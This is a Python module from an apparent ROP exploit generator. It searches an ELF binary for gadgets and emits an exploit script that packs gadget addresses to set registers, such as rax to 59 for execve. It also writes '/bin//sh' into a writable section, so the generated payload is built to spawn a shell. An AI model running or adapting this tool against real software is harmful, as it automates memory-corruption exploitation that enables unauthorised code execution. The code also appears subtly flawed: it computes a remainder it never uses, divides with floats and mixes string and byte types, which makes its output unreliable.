from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys

import general
import print_pretty
import categorize
import get_gadgets


# canWrite(): This routine gets gadgets which will help in writing stuff into a writable section. 
# This is the 3 gadgets this routine will return
# 
# 1. pop Reg1; ret  -- Load address where something is to be written.
# 2. pop Reg2; ret  -- Load the content to be written - 8 bytes
# 3. mov qword ptr[Reg1], Reg2; ret - Copy contents of Ret2 into address present in Reg1

def canWrite(movQwordGadgets, popGadgets):
    for gadget in movQwordGadgets:
        ops = gadget[-2]['operands']
        op1 = ops[0][-4:-1]
        op2 = ops[1]
        f1 = 0
        f2 = 0
        pop1 = None
        pop2 = None
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op1:
                f1 =1
                pop1 = popGadg
                break
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op2:
                f2 =1
                pop2 = popGadg
                break
        if(f1 and f2):
            return [gadget, pop1, pop2] # returns [ mov qword ptr [rega], reb, pop rega, pop regb ] 
    return list()


# changeRegValue(): This routine changes the value of a specified register. 
# Reg = Target Register
# CurrentValue - Present value of "rax"
# FinalValue - The value you want in "rax" (Say a system call number)
# 
# Eg:  Reg = "rax", CurrentValue = 0, FinalValue = 59 
# 
# This routine will find arithmetic gadgets related to the target register, tries chaining them.
#
# Finally, writes the payload into the file descriptor specified.

def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) : 

    RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
  
    # A variable 
    const = 0
    X = 0

    # Search for inc Reg
    # Go through the whole RegArithList and check if inc Reg is present. 

    X = 0
    while X < len(RegArithList) : 
        # print("Inside search for inc Reg")

        gadget = RegArithList[X]
        inst = gadget[0]

        if inst['mnemonic'] == "inc" : 

            if FinalValue > CurrentValue : 
                
                counter = 0
                while counter < (FinalValue - CurrentValue) : 

                    # Execute inc Reg; Ret

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of 'inc Reg; ret'")
                    fd.write("\n\t")

                    counter = counter + 1

                return 1
        
        X = X + 1
        
    # Search for dec Reg

    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]
        
        if inst['mnemonic'] == "dec": 

            if FinalValue < CurrentValue : 

                counter = 0
                while counter < (CurrentValue - FinalValue) : 

                    # Execute "dec Reg; ret"

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of ''dec Reg; ret'")
                    fd.write("\n\t")

                    counter = counter + 1
                
                return 1
       
        X = X + 1
    
    # Search for "add Reg, 1; ret" or "add Reg, -1; ret"

    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]

        if inst['mnemonic'] == "add" : 

            if inst['operands'][0].isnumeric() : 
                const = int(inst['operands'][0])
            else : 
                const = int(inst['operands'][1])
        
            # Case: "add Reg, 1; ret"
            if const == 1 and FinalValue > CurrentValue : 

                counter = 0
                while counter < (FinalValue - CurrentValue) : 

                    # execute "add Reg, 1; ret"

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of 'add Reg, 1; ret'")
                    fd.write("\n\t")

                    counter = counter + 1
                    
                return 1
            
            # Case: "add Reg, -1; ret"
            elif const == -1 and FinalValue < CurrentValue : 

                counter = 0
                while counter < (CurrentValue - FinalValue) : 

                    # execute "add Reg, -1; ret"

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of 'add Reg, -1; ret'")
                    fd.write("\n\t")

                    counter = counter + 1
            
                return 1

        X = X + 1


    # Search for "add Reg, const; ret"

    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]

        if inst['mnemonic'] == "add" : 
            
            if inst['operands'][0].isnumeric() : 
                const = int(inst['operands'][0])
            else : 
                const = int(inst['operands'][1])
            
            # Case "add Reg, const; ret" && const > 1
            if const > 1 and FinalValue > CurrentValue : 

                gap = FinalValue - CurrentValue
                quo = gap / const
                rem = gap % const

                while quo > 0 : 

                    # Execute add Reg, const; ret

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of add Reg, const; ret")
                    fd.write("\n\t")
                    
                    quo = quo - 1
                    
                    CurrentValue = CurrentValue + const
                
                # If CurrentValue is equal to FinalValue, goal achieved.
                if FinalValue == CurrentValue: 
                    return 1
                
                # Suppose that does not happen, 
                # Call changeRegValue again and attempt to chain other gadgets to get the intended FinalValue
                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) == 0 : 
                    print("Unable to find gadgets which can change", Reg, "'s value")
                    print("Exiting...")
                    sys.exit()

                # Suppose changeRegValue returns 1, success!
                else : 
                    return 1
        
            if const < -1 and FinalValue < CurrentValue : 

                gap = FinalValue - CurrentValue
                quo = gap / (-const)
                rem = gap % (-const)

                while quo > 0 : 

                    # Execute add Reg, const; ret

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of add Reg, const; ret")
                    fd.write("\n\t")
                    
                    quo = quo - 1
                    
                    CurrentValue = CurrentValue + const
                
                # If CurrentValue is equal to FinalValue, goal achieved.
                if FinalValue == CurrentValue: 
                    return 1
                
                # Suppose that does not happen, 
                # Call changeRegValue again and attempt to chain other gadgets to get the intended FinalValue
                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) == 0 : 
                    print("Unable to find gadgets which can change rax's value")
                    print("Exiting...")
                    sys.exit()

                # Suppose changeRegValue returns 1, success!
                else : 
                    return 1

    print("Unable to find gadgets to change a register's value")
    print("Exiting...")
    sys.exit() 


def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 

    RegList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, Reg)
   
    # Search for "pop Reg; ret"
    x = 0
    while x < len(RegList) : 

        gadget = RegList[x]
        inst = gadget[0]

        if inst['mnemonic'] == "pop" : 

            # "pop Reg; ret" is found
            # Steps to be taken: 
            #   1. Put Const onto stack
            #   2. Execute "pop Reg; ret"

            # Write it into the file
            
            # Write address of "pop Reg; ret"
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'pop Reg; ret'")
            fd.write("\n\t")
        
            # Write Const onto stack
            fd.write("payload += struct.pack('<Q', ")
            fd.write(str(hex(Const)))
            fd.write(")")
            fd.write("\n\t")
            
            return
        
        x = x + 1
    
  
    # Search for "xor Reg, Reg; ret"
    x = 0
    while x < len(RegList) : 
        
        gadget = RegList[x]
        inst = gadget[0]
       
        if inst['mnemonic'] == "xor" : 
            # "xor Reg, Reg; ret" is found
            # Loads 0 into Reg
            # Jackpot!
            # Steps to do: 
            #   1. Execute "xor Reg, Reg; ret"
            #   2. Call changeRegValue if Const != 0

            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
            fd.write("\n\t")
            
            if int(Const) != 0 : 
                if changeRegValue(GadgetList, Reg, 0, Const, fd) == 0: 
                    print("Unable to find gadgets which can change rax's value")
                    print("Exiting...")
                    sys.exit()

                else: 
                    return 1
        x = x + 1
    
    print("Unable to find necessary gadgets to load a value into a register")
    print("Exiting...")
    sys.exit()


# This routine generates payload which will write stuff into memory.
#
# data is of bytes() type
# addr is the address of a writable section of the executable
# fd is the file descriptor of python payload file

def WriteStuffIntoMemory(data, addr, fd) : 

    popGadgets = get_gadgets.getPopGadgets(get_gadgets.allGadgets)
    movQwordGadgets = get_gadgets.getMovQwordGadgets(get_gadgets.allGadgets)

    movpopGadgets = canWrite(movQwordGadgets, popGadgets)

    if len(movpopGadgets) == 0: 
        print("Didn't find gadgets necessary to write stuff into memory")
        print("ROP Chaining failed")
        sys.exit()

    movGadget = movpopGadgets[0][0]
    popGadget1 = movpopGadgets[1][0]
    popGadget2 = movpopGadgets[2][0]
   
    count = 0
    while len(data) > 0 : 

        if len(data) <= 8: 
            data_piece = data
            data = ''
        
        else : 
            data_piece = data[:8]
            data = data[8:]

        # Execute popGadget1 => Reg1 will have .data's address
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(popGadget1['address'])))
        fd.write(")")
        fd.write("\t\t# Address of pop Reg1; ret")
        fd.write("\n\t")

        # Put .data's address onto stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(addr)))
        fd.write(")")
        fd.write("\t\t# Address of .data section")
        fd.write("\n\t")
        addr = addr + 8

    
        # Execute popGadget2 => Reg2 will have "/bin/sh"
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(popGadget2['address'])))
        fd.write(")")
        fd.write("\t\t# Address of pop Reg2; ret")
        fd.write("\n\t")

        # Put "/bin//sh" into stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int.from_bytes(data_piece, byteorder = 'little')))
        fd.write(")")
        # fd.write("\t\t# ascii of '/bin//sh'")
        fd.write("\n\t")

        # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(movGadget['address'])))
        fd.write(")")
        fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
        fd.write("\n\t")
        


# This routine writes the header of the exploit python script.
def writeHeader(fd) : 

    fd.write("#!/usr/bin/env python2")
    fd.write("\n\n")
    fd.write("import struct")
    fd.write("\n\n")
    fd.write("if __name__ == '__main__' : ")
    fd.write("\n\n\t")
    fd.write("# Enter the amount of junk required")
    fd.write("\n\t")
    fd.write("payload = ''")
    fd.write("\n\n\t")

# This routine writes the footer of the exploit python script.
def writeFooter(fd): 

    fd.write("\n\t")
    fd.write("fd = open('payload.txt', 'wb')")
    fd.write("\n\t")
    fd.write("fd.write(payload)")
    fd.write("\n\t")
    fd.write("fd.close()")    
    fd.write("\n\t")
    fd.close()






        
    
    
    
    
